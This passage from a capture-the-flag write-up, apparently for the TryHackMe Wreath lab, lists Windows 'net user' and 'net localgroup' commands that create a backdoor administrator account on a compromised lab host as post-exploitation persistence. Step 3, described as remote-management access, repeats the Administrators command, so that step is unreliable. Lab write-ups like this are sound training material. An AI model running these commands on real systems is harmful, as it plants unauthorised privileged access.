**Task 21: Stabilisation & Post Exploitation**

For this task we have to make changes in the prov-serv only the commands are as follows...

Make sure to execute the commands in proper syntax cause the command prompt wont response to errors..
- 1. Create your a user with any name you want
 
         net user USERNAME PASSWORD /add

- 2. Add the user in the Administration directory
 
         net localgroup Administrators USERNAME /add

- 3. Now add the user in the remote managment group
 
         net localgroup Administrators USERNAME /add

- 4. Now verify wether you have done the process correctly
 
         net user <yourusername>

![Screenshot_2023-08-08_04_50_52](https://github.com/Anirudh-Saxena/Wreath-Writeup-THM/assets/73027020/2fa161a4-cb4b-411c-9d0b-7e7e4a1670c0)


